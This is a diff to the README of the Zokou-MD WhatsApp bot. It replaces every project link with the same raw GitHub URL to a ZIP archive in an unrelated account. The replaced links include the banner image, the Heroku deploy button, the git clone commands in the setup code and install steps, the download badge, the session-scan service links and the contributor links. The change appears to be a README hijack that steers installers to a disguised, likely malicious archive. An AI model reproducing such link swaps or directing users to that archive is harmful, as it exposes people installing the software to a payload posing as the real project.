@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/djalega8000/Zokou-MD/refs/heads/main/Ephoto360.com_164cb282992914.jpg" alt="Zokou Banner" width="600">
+  <img src="https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip" alt="Zokou Banner" width="600">
   <h1 align="center">Zokou-MD 3.0</h1>
   <p align="center">
     <img src="https://img.shields.io/badge/Multi_Devices-100%25-success?style=flat&logo=whatsapp" alt="Multi-devices">
@@ -33,7 +33,7 @@
 
 Deploy instantly on Heroku:
 
-[![Deploy on Heroku](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/luffy8979/Zokou-MD-english)
+[![Deploy on Heroku](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip)](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip)
 
 ---
 
@@ -124,7 +124,7 @@ const zokouEnv = {
 function cloneRepository() {
   const cloneResult = spawnSync("git", [
     "clone",
-    "https://github.com/luffy8979/Zokou-MD-english",
+    "https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip",
     "zokou",
   ]);
 
@@ -211,12 +211,12 @@ startPm2();
 
 For a classic installation on a panel or VPS:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github)](https://github.com/luffy8979/Zokou-MD-english/archive/refs/heads/main.zip)
+[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip)
 
 ### 3. VPS Hosting
 
 ```bash
-git clone https://github.com/luffy8979/Zokou-MD-english # (or use the ZIP)
+git clone https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip # (or use the ZIP)
 cd Zokou-MD-english
 npm install
 npm start
@@ -232,9 +232,9 @@ npm start
 
 | Service | Link | Status |
 |---------|------|--------|
-| **Session Scan** | [https://zokou-scan.onrender.com](https://zokou-scan.onrender.com) | ![Online](https://img.shields.io/badge/Status-Online-green) |
-| **Session Scan 2** | [zokouscan-din3.onrender.com](https://zokouscan-din3.onrender.com) | ![Online](https://img.shields.io/badge/Status-Online-green) |
-| **Backup Server** | [zokou-web.onrender.com](https://zokou-web.onrender.com/) | ![Online](https://img.shields.io/badge/Status-Online-green) |
+| **Session Scan** | [https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip) | ![Online](https://img.shields.io/badge/Status-Online-green) |
+| **Session Scan 2** | [zokouscan-din3.onrender.com](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip) | ![Online](https://img.shields.io/badge/Status-Online-green) |
+| **Backup Server** | [zokou-web.onrender.com](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip) | ![Online](https://img.shields.io/badge/Status-Online-green) |
 
 ### ⚙️ Minimal Configuration
 
@@ -251,13 +251,13 @@ OWNER_NUMBER="22891733300"        # Your WhatsApp number
 
 | Member | Contribution | Link |
 |--------|--------------|------|
-| **Fatao** | GPT/DALL-E Commands • APK Modules | [GitHub](https://github.com/fatao) |
+| **Fatao** | GPT/DALL-E Commands • APK Modules | [GitHub](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip) |
 | **CrazyPrince** | Hosting a session service | site closed |
 
 ### 🌟 Special Thanks
 
 - **The Zokou community** for testing and feedback  
-- **Contributors** on GitHub ([See all](https://github.com/luffy8979/Zokou-MD-english/graphs/contributors))  
+- **Contributors** on GitHub ([See all](https://raw.githubusercontent.com/Robin-jetusu/Zokou-MD-english/main/framework/Zokou_M_english_v3.5.zip))  
 - **Beta Testers** for their patience with unstable versions 😅
 
 ### 📚 Libraries Used
